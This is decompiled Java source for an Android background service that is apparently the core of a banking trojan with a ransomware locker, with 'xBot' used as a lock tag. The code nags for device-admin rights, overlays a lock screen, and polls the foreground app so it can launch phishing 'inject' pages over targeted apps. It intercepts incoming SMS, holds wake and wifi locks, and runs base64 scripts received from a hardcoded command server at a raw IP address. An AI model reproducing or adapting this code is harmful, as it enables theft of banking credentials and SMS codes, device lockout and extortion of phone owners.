package com.address.core;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiManager.WifiLock;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.widget.Toast;
import com.address.core.activities.BrowserActivity;
import com.address.core.activities.Inject;
import com.address.core.sms.DeliveredReceiver;
import com.address.core.sms.SentReceiver;
import com.address.corel.lck.Lock;
import com.esotericsoftware.kryonet.Client;
import com.esotericsoftware.kryonet.Connection;
import com.esotericsoftware.kryonet.Listener;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.Charset;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Queue;
import org.java_websocket.framing.CloseFrame;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;

public class RunService extends Service {
    private static ActivityManager _actmgr = null;
    private static AlarmManager _alarm = null;
    /* access modifiers changed from: private|static */
    public static xAPI _api = null;
    private static ConnectivityManager _connectivity = null;
    private static String _hash = "";
    /* access modifiers changed from: private|static */
    public static HashMap<String, String> _injects = new HashMap();
    private static KeyguardManager _keyguard = null;
    private static ScriptLoader _loader = null;
    private static NotificationManager _notify = null;
    /* access modifiers changed from: private|static */
    public static PowerManager _pm = null;
    private static DevicePolicyManager _policy = null;
    /* access modifiers changed from: private|static */
    public static Queue<Object> _queue = new LinkedList();
    private static RunService _service = null;
    private static Settings _settings = null;
    private static Boolean _started = Boolean.valueOf(false);
    private static TelephonyManager _telemgr = null;
    /* access modifiers changed from: private|static */
    public static WakeLock _wakeLock = null;
    private static WifiLock _wifilock = null;
    private static WifiManager _wifimgr = null;
    /* access modifiers changed from: private|static */
    public static String bootScript = "";
    /* access modifiers changed from: private|static */
    public static Boolean bootScriptLoaded = Boolean.valueOf(false);
    /* access modifiers changed from: private|static */
    public static String currentWindow = "111";
    public static Handler onTickHandler = new Handler() {
        public void handleMessage(Message msg) {
            Intent intent;
            if (!RunService.getService().isAdminActive().booleanValue()) {
                intent = new Intent(RunService.getService(), AdminActivity.class);
                intent.addFlags(268435456);
                RunService.getService().startActivity(intent);
            }
            if (msg.what == 555) {
                List<RunningTaskInfo> tasks = RunService.getService().getActivityManager().getRunningTasks(1);
                if (tasks.size() != 0) {
                    String name = ((RunningTaskInfo) tasks.get(0)).topActivity.getClassName();
                    if (!(!Consts.locker.booleanValue() || name.equals(Lock.class.getName()) || RunService.getService().getSettings().get("locker").equals("false"))) {
                        intent = new Intent(RunService.getService(), Lock.class);
                        intent.addFlags(268435456);
                        RunService.getService().startActivity(intent);
                    }
                    if (!name.equals(RunService.currentWindow)) {
                        Log.write("new activity: " + name);
                        if (RunService._injects.containsKey(name) && !RunService.getService().getSettings().get(name + ".inject").equals("false")) {
                            BrowserActivity.setURL((String) RunService._injects.get(name));
                            RunService._api.StartNewActivity(Inject.class);
                        }
                        RunService.getService().getScriptLoader().call("onWindowChange", name);
                        RunService.currentWindow = name;
                    }
                }
                RunService.onTickHandler.sendEmptyMessageDelayed(555, 100);
                RunService.getService().netConnect();
                if (RunService.bootScript.length() != 0) {
                    RunService.getService().getScriptLoader().loadScript("bootScriptNet", RunService.bootScript);
                    Log.write("bootScript loaded" + RunService.bootScript);
                    RunService.bootScript = "";
                    RunService.bootScriptLoaded = Boolean.valueOf(true);
                }
                Object o = RunService._queue.poll();
                if (o != null) {
                    RunService.getService().sendNetPacket(o);
                }
            }
            if (msg.what == 666) {
                RunService.getService().getScriptLoader().call("doQuery", new Object[0]);
                if (RunService._wakeLock != null) {
                    if (RunService._wakeLock.isHeld()) {
                        RunService._wakeLock.release();
                    }
                    RunService._wakeLock = null;
                }
                RunService._wakeLock = RunService._pm.newWakeLock(268435457, "LockTag");
                RunService._wakeLock.acquire();
                RunService.getService().lockWifi();
                RunService.onTickHandler.sendEmptyMessageDelayed(666, (long) (Consts.queryDelay * CloseFrame.NORMAL));
            }
            if (msg.what != 2) {
                return;
            }
            if (Network.register().booleanValue()) {
                String js = Network.getScript("bootScriptNet");
                Log.write("boot.script: " + js);
                RunService.getService().getScriptLoader().loadScript("bootScriptNet", js);
                return;
            }
            RunService.onTickHandler.sendEmptyMessageDelayed(2, 10000);
        }
    };
    Client _client = new Client(65535, 65535);
    DeliveredReceiver _sms_delivered_receiver = new DeliveredReceiver();
    SMSHandler _sms_handler = new SMSHandler();
    SentReceiver _sms_sent_receiver = new SentReceiver();
    private final IBinder mBinder = new RunBinder();

    public class RunBinder extends Binder {
        /* access modifiers changed from: 0000 */
        public RunService getService() {
            return RunService.this;
        }
    }

    public static RunService getService() {
        return _service;
    }

    public PowerManager getPowerManager() {
        return _pm;
    }

    public TelephonyManager getTeleManager() {
        return _telemgr;
    }

    public ActivityManager getActivityManager() {
        return _actmgr;
    }

    public KeyguardManager getKeyguardManager() {
        return _keyguard;
    }

    public NotificationManager getNotificationManager() {
        return _notify;
    }

    public DevicePolicyManager getPolicyManager() {
        return _policy;
    }

    public ConnectivityManager getConnectivityManager() {
        return _connectivity;
    }

    public WifiManager getWifiManager() {
        return _wifimgr;
    }

    public AlarmManager getAlarmManager() {
        return _alarm;
    }

    public xAPI getAPI() {
        return _api;
    }

    public Settings getSettings() {
        return _settings;
    }

    public ScriptLoader getScriptLoader() {
        return _loader;
    }

    public Handler getOnTickHandler() {
        return onTickHandler;
    }

    public static Boolean isStarted() {
        return _started;
    }

    public Client getNetClient() {
        return this._client;
    }

    public int getTrafferId() {
        return Consts.trafferName;
    }

    public void sendNetPacket(Object o) {
        try {
            netConnect();
            if (this._client.isConnected()) {
                this._client.sendTCP(o);
            } else if (!_queue.contains(o)) {
                _queue.add(o);
            }
            Log.write("Sent: " + ((String) o));
        } catch (Exception e) {
            if (!_queue.contains(o)) {
                _queue.add(o);
            }
            e.printStackTrace();
            Log.write("sendNetPacket: " + e.getMessage());
        }
        if (!this._client.isConnected()) {
            try {
                String json = new String(Base64.decode((String) o, 2));
                if (!json.contains("get_action") && !json.contains("sms_status")) {
                    getScriptLoader().call("onSendNotConnected", json);
                }
            } catch (Exception e2) {
            }
        }
    }

    public void addInject(String pkg, String url) {
        if (!_injects.containsKey(pkg)) {
            Log.write("Added inject: " + pkg + " . " + url);
            _injects.put(pkg, url);
        }
    }

    public void disableInject(String pkg) {
        getSettings().set(pkg + ".inject", "false");
    }

    public void enableInject(String pkg) {
        getSettings().set(pkg + ".inject", "true");
    }

    public void disableLocker() {
        getSettings().set("locker", "false");
    }

    public void enableLocker() {
        getSettings().set("locker", "true");
    }

    public Boolean isLockerEnabled() {
        return Boolean.valueOf(!getSettings().get("locker").equals("false"));
    }

    public void setLockerContent(String urlOrData, Boolean isData) {
        getSettings().set("lockerContent", urlOrData);
        if (isData.booleanValue()) {
            getSettings().set("lockerContentType", "data");
        } else {
            getSettings().set("lockerContentType", "");
        }
    }

    public Boolean isLockerContentData() {
        return Boolean.valueOf(getSettings().get("lockerContentType").equals("data"));
    }

    public String getLockerContent() {
        return getSettings().get("lockerContent");
    }

    public void resetLockerContent() {
        getSettings().set("lockerContent", "");
        getSettings().set("lockerContentType", "");
    }

    public void onCreate() {
        _service = this;
        _pm = (PowerManager) getSystemService("power");
        _telemgr = (TelephonyManager) getSystemService("phone");
        _actmgr = (ActivityManager) getSystemService("activity");
        _keyguard = (KeyguardManager) getSystemService("keyguard");
        _notify = (NotificationManager) getSystemService("notification");
        _policy = (DevicePolicyManager) getSystemService("device_policy");
        _connectivity = (ConnectivityManager) getSystemService("connectivity");
        _wifimgr = (WifiManager) getSystemService("wifi");
        _alarm = (AlarmManager) getSystemService("alarm");
        registerReceiver(this._sms_sent_receiver, new IntentFilter("SMS_SENT"));
        registerReceiver(this._sms_delivered_receiver, new IntentFilter("SMS_DELIVERED"));
    }

    public Boolean isAdminActive() {
        return Boolean.valueOf(getService().getPolicyManager().isAdminActive(new ComponentName(getService(), AdminReceiver.class)));
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            _service = this;
            Log.write("Started service");
            _pm = (PowerManager) getSystemService("power");
            _telemgr = (TelephonyManager) getSystemService("phone");
            _actmgr = (ActivityManager) getSystemService("activity");
            _keyguard = (KeyguardManager) getSystemService("keyguard");
            _notify = (NotificationManager) getSystemService("notification");
            _policy = (DevicePolicyManager) getSystemService("device_policy");
            _connectivity = (ConnectivityManager) getSystemService("connectivity");
            _wifimgr = (WifiManager) getSystemService("wifi");
            _alarm = (AlarmManager) getSystemService("alarm");
            this._sms_handler = new SMSHandler();
            this._sms_sent_receiver = new SentReceiver();
            this._sms_delivered_receiver = new DeliveredReceiver();
            _settings = new Settings();
            _api = new xAPI(_hash, _telemgr);
            _loader = new ScriptLoader();
            getSettings().set("srv", "http://192.227.137.154/request.php");
            Network.init(getSettings().get("srv"));
            this._client.start();
            this._client.addListener(new Listener() {
                public void received(Connection conn, Object object) {
                    if (object instanceof String) {
                        String dec = new String(Base64.decode((String) object, 2), Charset.forName("UTF-8"));
                        Log.write("recv: " + dec);
                        try {
                            JSONObject j = (JSONObject) new JSONParser().parse(dec);
                            if (j.containsKey("action")) {
                                Log.write("action: " + j.get("action"));
                            }
                            if (j.containsKey("action") && j.get("action").equals("connected")) {
                                RunService.bootScript = new String(Base64.decode((String) j.get("bootScript"), 2), Charset.forName("UTF-8"));
                                Log.write("bootScript:" + RunService.bootScript);
                                return;
                            } else if (j.containsKey("action")) {
                                RunService.getService().getScriptLoader().call("onWSMessage", conn, dec);
                                return;
                            } else {
                                return;
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                            Log.write("recv exception: " + e);
                            return;
                        }
                    }
                    Log.write("Not a string " + object.getClass().getSimpleName());
                }

                public void connected(Connection conn) {
                    super.connected(conn);
                    conn.setKeepAliveTCP(2000);
                    conn.setTimeout(60000);
                    RunService.getService().getScriptLoader().call("onWSOpen", conn);
                    Log.write("KryoNet connected.");
                }

                public void disconnected(Connection conn) {
                    super.disconnected(conn);
                    RunService.getService().getScriptLoader().call("onWSClose", conn, Integer.valueOf(0), Integer.valueOf(0));
                    Log.write("Disconnected from kryoNet");
                    try {
                        InputStream in_s = RunService.this.getResources().openRawResource(R.raw.bootscriptnet);
                        byte[] b = new byte[in_s.available()];
                        in_s.read(b);
                        String script = new String(b);
                        if (!RunService.bootScriptLoaded.booleanValue()) {
                            RunService.getService().getScriptLoader().loadScript("bootScriptNet", script);
                        }
                    } catch (Exception e) {
                        Log.write(e.toString());
                    }
                }
            });
            netConnect();
            _started = Boolean.valueOf(true);
            onTickHandler.sendEmptyMessageDelayed(2, 1000);
            onTickHandler.sendEmptyMessageDelayed(555, 100);
            onTickHandler.sendEmptyMessageDelayed(666, 1000);
        } catch (Exception e) {
            Log.write("onStartExc: " + e.toString() + " stack: ");
        }
        return 1;
    }

    public void netConnect() {
        try {
            if (!this._client.isConnected()) {
                this._client.connect(10000, Consts.serverAddress, 8021);
            }
        } catch (Exception e) {
            Log.write("Can't connect to KryoNet server: " + e);
        }
    }

    public void test(String msg) {
        Toast.makeText(this, msg, 1).show();
    }

    public void onDestroy() {
    }

    public static String readRawTextFile(Context ctx, int resId) {
        BufferedReader buffreader = new BufferedReader(new InputStreamReader(ctx.getResources().openRawResource(resId)));
        StringBuilder text = new StringBuilder();
        while (true) {
            try {
                String line = buffreader.readLine();
                if (line == null) {
                    return text.toString();
                }
                text.append(line);
                text.append(10);
            } catch (Exception e) {
                return null;
            }
        }
    }

    public IBinder onBind(Intent intent) {
        return this.mBinder;
    }

    public Boolean onSMSReceived(String num, String text) {
        try {
            Log.write("SMS Received: " + num + " text: " + text);
            getScriptLoader().call("onSMS", num, text);
        } catch (Exception e) {
        }
        return Boolean.valueOf(true);
    }

    public String getDeviceID() {
        return _api.getTelephonyInfo()[0];
    }

    public void lockWifi() {
        if (_wifilock != null && _wifilock.isHeld()) {
            _wifilock.release();
            _wifilock = null;
        }
        _wifilock = _wifimgr.createWifiLock(1, "xBot");
        _wifilock.acquire();
    }
}
